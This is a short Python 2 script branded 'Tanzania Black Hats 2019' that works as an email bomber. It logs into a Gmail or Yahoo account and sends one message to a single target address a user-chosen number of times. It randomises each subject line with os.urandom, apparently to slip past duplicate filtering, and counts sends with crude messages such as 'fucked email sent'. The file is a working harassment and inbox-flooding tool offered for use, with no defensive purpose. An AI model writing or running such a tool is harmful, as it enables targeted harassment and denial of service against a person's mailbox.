#!/usr/bin/python
#massemails
#tumia kwa makini am not responsible.
#Use it at your own risk !!!

print"\n";
print "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t>            mass email program                    >\n";
print "\t>         Coded By AuxGrep(mranonymous)                   >\n";
print "\t>           USE AT UR OWN RISK                     >\n";
print "\t>         TANZANIA BLACK HATS 2019                 >\n";
print "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\n";



import os
import smtplib
import getpass
import sys


server = raw_input ('MailServer gmail/yahoo: ')
user = raw_input('Email: ')
passwd = getpass.getpass('Password: ')


to = raw_input('\nTo: ')
#subject = raw_input('Subject: ') 
body = raw_input('Message: ')
total = input('Number of send: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Applies only to gmail and yahoo.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rfucked email sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n AM DONE  !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()
